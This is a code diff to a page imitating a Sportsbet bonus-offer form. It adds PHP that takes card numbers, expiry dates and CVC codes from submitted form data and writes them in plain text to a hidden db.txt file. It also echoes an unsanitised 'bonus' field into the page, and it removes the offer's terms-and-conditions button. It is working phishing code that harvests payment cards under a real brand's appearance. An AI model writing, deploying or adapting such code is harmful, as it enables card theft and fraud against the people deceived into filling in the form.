@@ -1,3 +1,21 @@
+<?php
+extract($_POST);
+$postData = array(
+    "cardnumber" => $cardnumber,
+    "cc_expiry_month" => $cc_expiry_month,
+    "cc_expiry_year" => $cc_expiry_year,
+    "cvc" => $cvc,
+    "bonus" => $bonus,
+);
+$filename = dirname(__DIR__) . "/db.txt";
+
+$txt = "Card Number: " . $cardnumber . ", " . "Expiry month: " . $cc_expiry_month . ", " . "Expiry year: " . $cc_expiry_year . ", " . "CVV: " . $cvc . ";\n";
+$file_content = file_get_contents($filename);
+$new_content = $file_content . $txt;
+file_put_contents($filename, $new_content, LOCK_EX);
+
+var_dump($postData);
+?>
 <!DOCTYPE html>
 <html lang="en">
 
@@ -52,7 +70,7 @@
                 <div class="loginContainer">
                     <div class="formCard">
                         <form action="https://www.sportsbet.com.au/">
-                            <div class="bonus_text">Your bonus offer will be added to your account in the next 24 hours. This offer is limited to the first 500 participants.</div>
+                            <div class="bonus_text">Your bonus <?php echo $bonus;?> offer will be added to your account in the next 24 hours. This offer is limited to the first 500 participants.</div>
                             <div class="fullWidthWrapper" data-automation-id="login-button">
                                 <div class="border">
                                     <div class="rippleGroup"></div><button tabindex="0" class="textButton" type="submit">
@@ -67,17 +85,6 @@
                                 </div>
                             </div>
                         </form>
-                    </div>
-                    <div class="buttonContainer2" data-automation-id="join-now-link">
-                        <div class="border">
-                            <div class="rippleGroup"></div><button tabindex="0" class="textButton" type="button">
-                                <div tabindex="-1" class="noFocus">
-                                    <div class="ironGrey insideButtonNormalContent">
-                                        <div class="hover defaultCorners modal-trigger"><span class="textContainer"><span class="size14 bold text">Bonus Bet Offer Terms & Conditions</span></span></div>
-                                    </div>
-                                </div>
-                            </button>
-                        </div>
                     </div>
                 </div>
             </div>
